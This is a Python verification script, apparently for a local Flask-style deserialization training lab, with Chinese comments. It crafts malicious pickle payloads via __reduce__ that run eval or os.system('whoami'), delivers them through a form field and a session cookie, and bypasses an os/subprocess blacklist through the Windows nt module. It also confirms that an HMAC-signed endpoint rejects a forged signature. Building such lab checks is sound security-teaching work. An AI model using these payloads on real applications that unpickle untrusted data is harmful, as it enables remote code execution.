# -*- coding: utf-8 -*-
"""验证 SessionForge 反序列化靶场 3 个 FLAG 可解 + 安全对照打不动
（命令执行证据用"写标记文件"，避免沙盒吞 stdout）"""
import base64
import os
import pickle
import requests

BASE = "http://127.0.0.1:5034"
LABS = r"C:\Users\clnk\WorkBuddy\2026-07-18-16-15-12\labs"
MARKER = os.path.join(LABS, "rce_marker.txt")

WRITE_EXPR = ("open(r'%s','w').write('PWNED')" % MARKER).replace("\\", "/")


def make_payload(callable_obj, args):
    class E:
        def __reduce__(self):
            return (callable_obj, args)
    return base64.b64encode(pickle.dumps(E())).decode()


def check_flags():
    r = requests.get(BASE + "/")
    return {
        "flag1": "FLAG1 无保护 ✅" in r.text,
        "flag2": "FLAG2 Cookie入口 ✅" in r.text,
        "flag3": "FLAG3 黑名单绕过 ✅" in r.text,
    }


requests.get(BASE + "/reset")
if os.path.exists(MARKER):
    os.remove(MARKER)
print("重置后:", check_flags())
print()

# FLAG1 无保护：eval 执行"写文件"表达式（还原非 dict → 触发）
print("=== FLAG1 无保护 pickle.loads ===")
payload = make_payload(eval, (WRITE_EXPR,))
r = requests.post(BASE + "/restore", data={"data": payload})
print("还原非dict触发:", "还原出非预期对象" in r.text)
print("FLAG1:", "FLAG1" if check_flags()["flag1"] else "未触发")
print()

# FLAG2 Cookie 入口
print("=== FLAG2 Cookie 入口 ===")
payload = make_payload(eval, (WRITE_EXPR,))
r = requests.get(BASE + "/restore-cookie", cookies={"session_data": payload})
print("Cookie触发:", "还原出非预期对象" in r.text)
print("FLAG2:", "FLAG2" if check_flags()["flag2"] else "未触发")
print()

# FLAG3 黑名单绕过：黑名单拦 os/subprocess，但 os.system 的 pickle 实际引用 nt 模块
#（Windows 上 os 的底层实现）→ 黑名单漏了等价模块 → 绕过
print("=== FLAG3 黑名单绕过 ===")
import os as _os
payload_os = make_payload(_os.system, ("whoami",))
r = requests.post(BASE + "/restore-limited", data={"data": payload_os})
print("os.system 绕过(还原非dict):", "还原出非预期对象" in r.text)
# 对照：builtins.eval 确实被黑名单拦
payload_eval = make_payload(eval, (WRITE_EXPR,))
r = requests.post(BASE + "/restore-limited", data={"data": payload_eval})
print("builtins.eval 被拦(对照):", "被拦截" in r.text or "反序列化错误" in r.text)
print("FLAG3:", "FLAG3" if check_flags()["flag3"] else "未触发")
print()

# 安全对照：HMAC 签名校验
print("=== 安全对照 /restore-secure ===")
r = requests.post(BASE + "/restore-secure", data={"data": payload, "sig": "fakesignature"})
print("伪造签名被拒:", "签名校验失败" in r.text)
print()

print("=== 最终状态 ===")
print(check_flags())
